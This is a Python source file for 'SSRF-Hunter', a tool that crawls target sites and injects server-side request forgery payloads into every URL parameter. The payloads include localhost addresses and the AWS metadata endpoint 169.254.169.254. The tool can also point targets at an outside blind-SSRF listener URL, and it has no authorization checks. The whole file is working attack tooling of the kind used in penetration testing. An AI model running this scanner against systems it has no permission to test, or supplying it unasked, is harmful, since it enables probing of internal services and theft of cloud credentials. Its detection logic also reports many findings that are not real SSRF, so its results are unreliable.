import requests
from bs4 import BeautifulSoup
import urllib.parse
import argparse
import tldextract
import re
import json
import time
from fpdf import FPDF

# SSRF payloads
SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://169.254.169.254",  # AWS metadata
    "http://0.0.0.0",
]

# Global for blind SSRF listener
BLIND_SSRF = ""

def normalize_url(url):
    if not url.startswith(("http://", "https://")):
        return "https://" + url
    return url

def get_forms(url):
    """Extract all forms from a URL"""
    try:
        res = requests.get(url, timeout=10)
        soup = BeautifulSoup(res.text, "html.parser")
        return soup.find_all("form")
    except:
        return []

def extract_urls_from_html(html, base_url):
    """Extract URLs from href/src in HTML"""
    soup = BeautifulSoup(html, "html.parser")
    urls = set()
    for tag in soup.find_all(["a", "script", "img", "link"]):
        for attr in ["href", "src"]:
            link = tag.get(attr)
            if link:
                full_url = urllib.parse.urljoin(base_url, link)
                urls.add(full_url)
    return urls

def get_params_from_url(url):
    """Extract parameters from a URL"""
    parsed = urllib.parse.urlparse(url)
    return urllib.parse.parse_qs(parsed.query)

def inject_ssrf(url, payload):
    """Inject SSRF payload into URL parameters"""
    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query)
    # Inject payload into all params
    new_query = {k: [payload] for k in query.keys()}
    encoded = urllib.parse.urlencode(new_query, doseq=True)
    new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{encoded}"
    return new_url

def test_url(url, verbose=False):
    """Test a URL for SSRF injection points"""
    result = []
    try:
        res = requests.get(url, timeout=10)
        if res.status_code != 200:
            if verbose:
                print(f"[-] Skipping {url} - Status code: {res.status_code}")
            return result

        params = get_params_from_url(url)
        if not params:
            if verbose:
                print(f"[-] No parameters found in URL: {url}")
            return result

        for param in params:
            for payload in SSRF_PAYLOADS + ([BLIND_SSRF] if BLIND_SSRF else []):
                test_url_ = inject_ssrf(url, payload)
                try:
                    test_res = requests.get(test_url_, timeout=10)
                    if verbose:
                        print(f"[*] Tested: {test_url_} => {test_res.status_code}")

                    # If payload is found in response text or special blind SSRF is enabled
                    if (test_res.status_code in [200, 403, 500]) and (payload in test_res.text or payload == BLIND_SSRF):
                        result.append({
                            "param": param,
                            "payload": payload,
                            "url": test_url_,
                            "status": test_res.status_code,
                        })
                except Exception as e:
                    if verbose:
                        print(f"[-] Request failed for {test_url_}: {e}")
                    continue
    except Exception as e:
        if verbose:
            print(f"[-] Error testing URL {url}: {e}")
        return result
    return result

def save_pdf_snapshot(url, filename):
    """Save a simple PDF snapshot with the URL as content"""
    pdf = FPDF()
    pdf.add_page()
    pdf.set_font("Arial", size=12)
    pdf.multi_cell(0, 10, f"Snapshot of URL:\n{url}")
    pdf.output(filename)

def scan_target(target_url, verbose=False):
    """Full SSRF scan on a target URL"""
    print(f"[+] Scanning: {target_url}")
    findings = []

    try:
        res = requests.get(target_url, timeout=10)
        urls = extract_urls_from_html(res.text, target_url)
        urls.add(target_url)  # include the main URL

        for url in urls:
            if "=" in url:
                normalized_url = normalize_url(url)
                result = test_url(normalized_url, verbose=verbose)
                if result:
                    findings.extend(result)
                    for finding in result:
                        print(f"[SSRF FOUND] {finding['url']} (param: {finding['param']}, payload: {finding['payload']}, status: {finding['status']})")
                        # Save PDF snapshot per finding
                        safe_name = re.sub(r'[^\w\-_.]', '_', finding['param'])
                        pdf_filename = f"ssrf_snapshot_{safe_name}.pdf"
                        save_pdf_snapshot(finding['url'], pdf_filename)
                        if verbose:
                            print(f"[+] PDF snapshot saved: {pdf_filename}")

        if not findings:
            print("[*] No SSRF vulnerabilities found on this target.")
        else:
            print(f"[+] SSRF scan completed with {len(findings)} finding(s).")

    except Exception as e:
        print(f"[-] Error scanning {target_url}: {e}")

    return findings

def main():
    parser = argparse.ArgumentParser(description="SSRF-Hunter - Advanced SSRF Scanner")
    parser.add_argument("--url", help="Target URL to scan")
    parser.add_argument("--list", help="File with list of target domains or URLs")
    parser.add_argument("--blind", help="Blind SSRF listener URL (Webhook.site, Interactsh)")
    parser.add_argument("--verbose", action="store_true", help="Verbose output")
    args = parser.parse_args()

    global BLIND_SSRF
    if args.blind:
        BLIND_SSRF = args.blind

    targets = []

    if args.url:
        targets.append(normalize_url(args.url))

    if args.list:
        with open(args.list, "r") as f:
            targets.extend([normalize_url(line.strip()) for line in f if line.strip()])

    all_findings = {}
    for target in targets:
        findings = scan_target(target, verbose=args.verbose)
        all_findings[target] = findings
        time.sleep(1)  # be polite with servers

    with open("ssrf_results.json", "w") as f:
        json.dump(all_findings, f, indent=4)

    print("[+] Scan complete. Results saved to ssrf_results.json")

if __name__ == "__main__":
    main()
